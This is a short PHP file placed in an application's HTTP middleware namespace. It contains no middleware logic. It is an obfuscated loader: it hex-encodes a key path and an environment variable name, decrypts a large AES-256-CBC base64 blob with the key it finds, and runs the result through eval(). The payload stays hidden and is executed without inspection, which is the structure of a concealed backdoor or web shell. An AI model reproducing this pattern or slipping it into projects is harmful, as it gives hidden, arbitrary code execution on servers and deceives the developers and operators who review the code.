<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Is4TDzzqDqohhK0jW3FMIg==');

$c=base64_decode(

'n/s1UI2BvEKNkBAtsZwNyvNbnOTMKytg76P5xEYTOFhSlQT3XuTI408Bf13lHsHYQYPyG1X163xv' .
'BdgRnrB8rhSFW37YRFbK815QZaz9PuN2Vrg4SE83rTXnE6vpfycDIxwaoJhXSiF/g1Ixpf2TJaZC' .
'PJ0107EHr8oD712WvWcMZ5S7OY6k5Vh009tMQ7USxW8paYMjsw7pkA8fE8hm3PFbbm1OdwOI/z8h' .
'az1aJuAq0nl5fwedHMAf++u9p7JFO1K4lBdE664JVZPVbaSzDXGHNdBYUk0BgpIF0IJx5l42t2W6' .
'wcfz0nEk9DH44GswjZ2+9vIywwRDVzolaOCzJoJo2TdpcBI4Evc8jWLm7Cx34weZ9U//LgzNldXt' .
'9WGqklAF//mWUVTOxmwlY+sUu+y8Y+usvzwnHVcaHcac5xFK9e4AyrEk263MWTFEeHaVeIt0fu28' .
'IxcyBgkChHqiF00epSwxfJ9meuPt1BW0qGeQkR6zvEmKF/KW/xUAj5952Ug3Nlb0XYeUuDw/7FVr' .
'BBY01tdgvgu0BT8uKmBO7uylNN5n0e8ZZSph9LafpAptNVmXL/i5qQ1In+i+yYdES5WLnPwe5P+L' .
'we3PSVyY9KAWMfZdmOw/o0E1ls1tCWRezlGxFyH/386Fr6oMOA42BTacK7lLYZ5CEfeHI6zVA17u' .
'qq9ySHoXeoDTJCow9knRH2+Y2+xNv+HD9F+GS9lOyLny78p4ozTol/4Jx9cDyg3ecL7QmiOC6fZQ' .
'ekrSmL0VKD4AIIkCqBSXxLpFxWr722nG6/NxCJb05NMLVp5v3RWszoZqxvtCmX4URgrA42FfWnhn' .
'E6xLmIBWmn2iF8xI/S4XO5kMF6COkuutjTrnggFlTxBh0lOCqYlRAb69NCCq2j0uMgH1VMDG/U+5' .
'VcKWIKVQFtDuE+kgQ4ImVKXXMT7RJuK0sSKUizJTmHXgFJTiymFUMRmjxKJq+2wo9bkAdvF/F/O5' .
'sI2QyYBVuEab2DFmsM8UTGvz7DiD9TfJB848Bher0p9ASMGuQiv2W2aEM9HXMtbnnuE5qWOrUccp' .
'TQIJwKHxdlLPyAdHG4ONSCWWRIL8dPf/w9gvSGAQ1CcOnM1DyvHbqIK3/AiQXU8axv6wcdq6wlwb' .
'ODWoiGrfrZStVqXAm7l+QgH6uktCf9gnt53GDgnTyptqXH0H95AGraO2WLs+373+0TIfSugnIYzp' .
'ZOSfTX6spSsMRCidDEI3pYHStNF9gHQlShfBo9ZhKhXJWsC2tMnGPXeodk2rExUvElyOvKQ7bR6F' .
'ej+UKPfopr8r5oe4Q+Z7F0oz7FGAJxAC7xGziPUdAeuoA9JkBc+t+jehU5q2yM1DE1IRd1MmBR3Z' .
'BFUzkxE3Vxeknv8w1MclvsJdXUa13sg+X4tIPUlrHuICRy+WNfRLOyniFA660dT6N3t1dlgVD9o2' .
'ajsiUk/bpyWDMZmiPJVEgB/5Gx3JnNhBXhodEnG2AJ73zBPFtx8gT86veIor9RR8x50EF8PdEoeX' .
'aAglzpvqZga34LDMYsmlQz9vGSc0zw3EskpJOw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

